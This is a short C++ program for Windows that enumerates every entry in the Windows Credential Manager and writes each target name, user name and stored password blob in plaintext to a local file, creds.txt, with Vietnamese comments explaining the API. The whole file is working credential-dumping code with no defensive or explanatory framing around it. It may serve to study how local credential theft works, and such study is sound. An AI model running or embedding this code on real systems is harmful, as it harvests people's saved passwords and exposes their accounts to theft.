#include <iostream>
#include <fstream>
#include <windows.h>
#include <wincred.h>

#pragma comment(lib, "advapi32.lib");

using namespace std;

void saveCredentials();

int main(){
    saveCredentials();
}

void saveCredentials(){
    ofstream savefile("creds.txt");
    if(!savefile.is_open()){
        cerr << "Failed to open file for writing \n";
    }

    DWORD creds_count;
    PCREDENTIAL *results_credentials_array; // khai bao con tro tro den mang creds tra ve

    if(CredEnumerate(NULL, 0, &creds_count, &results_credentials_array)){ // ham nay se truy van creds trong windows manager va tra ve so luong creds, dia chi cua mang creds neu co (TRUE, FALSE) https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew?utm_source=chatgpt.com
        cout << "Found creds: " << creds_count << "\n";
        for(DWORD i = 0; i < creds_count; i++){
            savefile << "TargetName: " << results_credentials_array[i]->TargetName << "\n";
            if(results_credentials_array[i]->UserName){
                savefile << "UserName: " << results_credentials_array[i]->UserName << "\n";
            }else{
                savefile << "No UserName";
            }
            if(results_credentials_array[i]->CredentialBlobSize > 0){
                string password((char*)results_credentials_array[i]->CredentialBlob, results_credentials_array[i]->CredentialBlobSize);
                savefile << "Password: " << password << "\n";
            }
            savefile << "-----------------------------------\n";
        }
        CredFree(results_credentials_array);
    }else{
        cerr << "Failed to enumerate credentials" << GetLastError() << "\n";
    }
}